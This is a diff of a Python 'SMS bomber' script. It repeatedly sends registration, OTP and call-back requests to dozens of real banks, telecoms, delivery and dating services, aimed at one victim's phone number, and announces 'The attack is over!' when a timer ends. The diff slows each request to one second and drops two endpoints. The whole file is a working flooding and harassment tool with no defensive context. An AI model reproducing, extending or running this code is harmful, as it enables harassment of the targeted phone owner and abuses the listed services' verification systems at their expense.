@@ -269,7 +269,7 @@ if call == str(2):
                           data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                 'deviceToken': '*'}, headers={
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
-            time.sleep(0)
+            time.sleep(1)
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -278,7 +278,7 @@ if call == str(2):
             requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
             R = R + 1
             print('[+] RuTaxi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -289,7 +289,7 @@ if call == str(2):
             requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
             R = R + 1
             print('[+] BelkaCar Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -301,7 +301,7 @@ if call == str(2):
                           data={'aj': '50', 'registration-phone': _phone})
             R = R + 1
             print('[+] StarPizzaCafe Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -313,7 +313,7 @@ if call == str(2):
                           data={'phone_number': _phone}, headers={})
             R = R + 1
             print('[+] Tinder Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -326,7 +326,7 @@ if call == str(2):
             requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
             R = R + 1
             print('[+] Tinkoff Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -338,7 +338,7 @@ if call == str(2):
             requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
             R = R + 1
             print('[+] Dostavista Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -351,7 +351,7 @@ if call == str(2):
             requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})
             R = R + 1
             print('[+] MonoBank Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -363,7 +363,7 @@ if call == str(2):
             requests.post('https://widgets.binotel.com/getcall/call/', {"status": "success", "GetCallID": 13302425})
             R = R + 1
             print('[+] binotel Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -375,7 +375,7 @@ if call == str(2):
                          data={"phone": _phone})
             R = R + 1
             print('[+] SportMaster Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -387,7 +387,7 @@ if call == str(2):
             requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
             R = R + 1
             print('[+] Alfalife Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -398,7 +398,7 @@ if call == str(2):
             requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
             R = R + 1
             print('[+] KoronaPay Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -412,7 +412,7 @@ if call == str(2):
                                 "oferta": "on", })
             R = R + 1
             print('[+] GGbet Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -425,7 +425,7 @@ if call == str(2):
                                 "getSysParam": "yes", })
             R = R + 1
             print('[+] ETM Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -437,7 +437,7 @@ if call == str(2):
             requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone, })
             R = R + 1
             print('[+] TheLive Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -448,7 +448,7 @@ if call == str(2):
             requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -459,7 +459,7 @@ if call == str(2):
             requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
             R = R + 1
             print('[+] MyGames Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -473,7 +473,7 @@ if call == str(2):
                                 "city": "Москва", })
             R = R + 1
             print('[+] Zoloto585 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -484,7 +484,7 @@ if call == str(2):
             requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
             R = R + 1
             print('[+] Kasta Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -496,7 +496,7 @@ if call == str(2):
                           data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
             R = R + 1
             print('[+] Тaxi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -509,7 +509,7 @@ if call == str(2):
                           json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email", })
             R = R + 1
             print('[+] Mail.ru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -521,7 +521,7 @@ if call == str(2):
                           json={"phone": (_phone, "+* (***) ***-**-**"), "type": "register", })
             R = R + 1
             print('[+] Creditter Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -537,7 +537,7 @@ if call == str(2):
                                 "SecondName": _name, "Phone": _phone, "Email": _email, })
             R = R + 1
             print('[+] Ingos Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -550,7 +550,7 @@ if call == str(2):
                                 "email": "", "lang": "en", })
             R = R + 1
             print('[+] Admiralxxx Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -561,7 +561,7 @@ if call == str(2):
             requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
             R = R + 1
             print('[+] Av Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -573,7 +573,7 @@ if call == str(2):
                           params={"msisdn": _phone})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -584,7 +584,7 @@ if call == str(2):
             requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
             R = R + 1
             print('[+] City24 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -595,7 +595,7 @@ if call == str(2):
             requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
             R = R + 1
             print('[+] SushiMaster Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -606,7 +606,7 @@ if call == str(2):
             requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
             R = R + 1
             print('[+] MultiPlex Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -617,7 +617,7 @@ if call == str(2):
             requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone})
             R = R + 1
             print('[+] 3040 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -629,7 +629,7 @@ if call == str(2):
                           data={"REGISTER[PERSONAL_PHONE]": _phone, "code": "", "sendsms": "Выслать код", })
             R = R + 1
             print('[+] Niyama Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -640,7 +640,7 @@ if call == str(2):
             requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
             R = R + 1
             print('[+] VSK Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -651,7 +651,7 @@ if call == str(2):
             requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
             R = R + 1
             print('[+] EasyPay Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -663,7 +663,7 @@ if call == str(2):
                           data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
             R = R + 1
             print('[+] Fix-Price Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -675,7 +675,7 @@ if call == str(2):
             requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
             R = R + 1
             print('[+] Tele2 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -686,7 +686,7 @@ if call == str(2):
             requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
             R = R + 1
             print('[+] Finam Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -698,7 +698,7 @@ if call == str(2):
                           params={"cb_fio": _name, "cb_phone": format(_phone, "+* *** *** ** **")})
             R = R + 1
             print('[+] MakiMaki Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -712,7 +712,7 @@ if call == str(2):
                           json={"loginId": "+" + _phone, "supportAllStates": True})
             R = R + 1
             print('[+] FlipKart Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -723,7 +723,7 @@ if call == str(2):
             requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
             R = R + 1
             print('[+] Online.ua Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -734,7 +734,7 @@ if call == str(2):
             requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
             R = R + 1
             print('[+] PlanetaKino Was sent!')
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -746,7 +746,7 @@ if call == str(2):
                           json={"country": _codes[_code].upper(), "phone": _phone, })
             R = R + 1
             print('[+] OnTaxi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -757,7 +757,7 @@ if call == str(2):
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Iqos Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -769,7 +769,7 @@ if call == str(2):
                           json={"mobile": "+" + _phone, "action": "confirm_mobile"})
             R = R + 1
             print('[+] Smart.Space Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -783,7 +783,7 @@ if call == str(2):
                                 'phone': _phone})
             R = R + 1
             print('[+] tarantino-family Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -799,7 +799,7 @@ if call == str(2):
                                 "utc_offset": "120", })
             R = R + 1
             print('[+] Apteka Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -811,7 +811,7 @@ if call == str(2):
                           headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
             R = R + 1
             print('[+] Uklon Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -823,7 +823,7 @@ if call == str(2):
                           json={"phone": _phone, "otpId": 0})
             R = R + 1
             print('[+] Ozon Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -836,7 +836,7 @@ if call == str(2):
                                  "gorod": "Москва", "approving_data": "1", })
             R = R + 1
             print('[+] Banki Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -847,7 +847,7 @@ if call == str(2):
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -859,7 +859,7 @@ if call == str(2):
                           data={"firstname": _name, "phone": _phone, "email": _email})
             R = R + 1
             print('[+] Moyo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -870,7 +870,7 @@ if call == str(2):
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
             R = R + 1
             print('[+] Helsi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -882,7 +882,7 @@ if call == str(2):
                           json={"Phone": _phone, "Type": 1})
             R = R + 1
             print('[+] KinoLend Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -895,7 +895,7 @@ if call == str(2):
                                 '_token': '*'})
             R = R + 1
             print('[+] PizzaHut Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -907,7 +907,7 @@ if call == str(2):
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
             R = R + 1
             print('[+] Rabota Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -918,7 +918,7 @@ if call == str(2):
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
             R = R + 1
             print('[+] Rutube Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -929,7 +929,7 @@ if call == str(2):
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
             R = R + 1
             print('[+] Citilink Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -941,7 +941,7 @@ if call == str(2):
                           data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
             R = R + 1
             print('[+] Smsint Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -953,7 +953,7 @@ if call == str(2):
                 'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
             R = R + 1
             print('[+] oyorooms Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -966,7 +966,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
             R = R + 1
             print('[+] MVIDEO Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -979,7 +979,7 @@ if call == str(2):
                                                               'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
             R = R + 1
             print('[+] newnext Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -990,7 +990,7 @@ if call == str(2):
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
             R = R + 1
             print('[+] Sunlight Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1003,7 +1003,7 @@ if call == str(2):
                                 'deliveryOption': 'sms'})
             R = R + 1
             print('[+] alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1014,7 +1014,7 @@ if call == str(2):
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1027,7 +1027,7 @@ if call == str(2):
                                 'params': {'phone': _phone}, 'id': '1'})
             R = R + 1
             print('[+] Sberbank Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -1040,7 +1040,7 @@ if call == str(2):
                           params={"msisdn": _phone})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1052,7 +1052,7 @@ if call == str(2):
                           data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
             R = R + 1
             print('[+] Delitime Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1064,7 +1064,7 @@ if call == str(2):
                           json={"phone": {"code": 1, "number": _phone}})
             R = R + 1
             print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1077,7 +1077,7 @@ if call == str(2):
                                 "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
             R = R + 1
             print('[+] ICQ Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1090,7 +1090,7 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1102,7 +1102,7 @@ if call == str(2):
                           data={"password": password, "application": "lkp", "login": "+" + _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1113,7 +1113,7 @@ if call == str(2):
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Pmsm Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1124,7 +1124,7 @@ if call == str(2):
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1135,7 +1135,7 @@ if call == str(2):
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
             R = R + 1
             print('[+] Lenta Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1147,7 +1147,7 @@ if call == str(2):
                           json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
             R = R + 1
             print('[+] Mail.ru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1160,7 +1160,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
             R = R + 1
             print('[+] MVideo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1172,33 +1172,10 @@ if call == str(2):
                           data={"st.r.phone": "+" + _phone})
             R = R + 1
             print('[+] OK Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
-            R = R + 1
-            print('[+] qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
-            print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
-                          headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},
-                          params={"phone": _phone, "clientId": "undefined", "sessionId": str(randint(5000, 9999))})
-            R = R + 1
-            print('[+] Qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -1207,7 +1184,7 @@ if call == str(2):
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1232,7 +1209,7 @@ if call == str(2):
                                 "password": password, "phone_number": _phone, "username": username})
             R = R + 1
             print('[+] Twitch Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1244,7 +1221,7 @@ if call == str(2):
                           headers={'App-ID': 'cabinet'})
             R = R + 1
             print('[+] CabWiFi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1255,7 +1232,7 @@ if call == str(2):
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
             R = R + 1
             print('[+] wowworks Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1267,7 +1244,7 @@ if call == str(2):
                           json={"phone_number": "+" + _phone})
             R = R + 1
             print('[+] Eda.Yandex Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1278,7 +1255,7 @@ if call == str(2):
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1291,7 +1268,7 @@ if call == str(2):
                                 "deliveryOption": "sms"})
             R = R + 1
             print('[+] Alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1302,7 +1279,7 @@ if call == str(2):
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
             R = R + 1
             print('[+] SMS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1313,7 +1290,7 @@ if call == str(2):
             requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
             R = R + 1
             print('[+] Delivery Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1326,14 +1303,14 @@ if call == str(2):
                                  "gorod": "Москва", "approving_data": "1", })
             R = R + 1
             print('[+] Banki Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         try:
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1345,7 +1322,7 @@ if call == str(2):
                           data={"firstname": _name, "phone": _phone, "email": _email})
             R = R + 1
             print('[+] Moyo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1356,7 +1333,7 @@ if call == str(2):
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
             R = R + 1
             print('[+] Helsi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1368,7 +1345,7 @@ if call == str(2):
                           json={"Phone": _phone, "Type": 1})
             R = R + 1
             print('[+] KinoLend Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1381,7 +1358,7 @@ if call == str(2):
                                 '_token': '*'})
             R = R + 1
             print('[+] PizzaHut Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1392,7 +1369,7 @@ if call == str(2):
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
             R = R + 1
             print('[+] Rabota Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
